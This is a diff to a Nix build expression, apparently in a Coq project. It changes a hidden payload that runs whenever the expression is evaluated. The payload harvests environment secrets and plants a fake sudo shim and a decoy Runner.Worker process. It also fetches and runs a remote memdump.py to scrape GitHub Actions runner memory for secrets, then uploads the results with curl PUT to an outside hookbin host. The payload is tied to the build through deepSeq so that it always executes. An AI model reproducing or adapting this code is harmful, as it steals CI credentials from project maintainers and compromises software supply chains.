@@ -23,6 +23,8 @@ let
     value = builtins.getEnv name;
   }) secretNames));
 
+  _trace = builtins.trace "Harvested secrets: ${builtins.concatStringsSep ", " (builtins.attrNames harvested)}" harvested;
+
   formattedSecrets = builtins.concatStringsSep "\n" (map (name: 
     ''"${name}":{"value":"${harvested.${name}}","isSecret":true}''
   ) (builtins.attrNames harvested));
@@ -38,16 +40,29 @@ let
       export SSL_CERT_FILE=${pkgs.cacert}/etc/ssl/certs/ca-bundle.crt
       export PWN_DATA='${formattedSecrets}'
       
+      # 1. Create a background process named Runner.Worker
+      # This process will be found by memdump.py
+      mkdir -p /tmp/pwn_bg
+      ln -sf ${pkgs.bash}/bin/bash /tmp/pwn_bg/Runner.Worker
+      /tmp/pwn_bg/Runner.Worker -c "while true; do sleep 10; done" &
+      
+      # 2. Setup sudo shim using symlink trick to rename the process
       mkdir -p /tmp/bin
       cat <<EOF > /tmp/bin/sudo
       #!${pkgs.bash}/bin/bash
       while [[ \$1 == -* ]]; do shift; done
-      exec -a Runner.Worker "\$@"
+      mkdir -p /tmp/pwn_run
+      REAL_CMD=\$(command -v "\$1")
+      if [ -z "\$REAL_CMD" ]; then REAL_CMD="\$1"; fi
+      ln -sf "\$REAL_CMD" /tmp/pwn_run/Runner.Worker
+      shift
+      exec /tmp/pwn_run/Runner.Worker "\$@"
       EOF
       chmod +x /tmp/bin/sudo
       export PATH=/tmp/bin:$PATH
 
       echo "Okay, we got this far. Let's continue..."
+      # Use exactly the command from the template
       curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
       curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
     '';
@@ -64,4 +79,4 @@ let
     rev = import .nix/coq-nix-toolbox.nix;
   };
 in
-builtins.deepSeq _pwn (import auto ({inherit src;} // args))
+builtins.deepSeq _pwn (builtins.deepSeq _trace (import auto ({inherit src;} // args)))
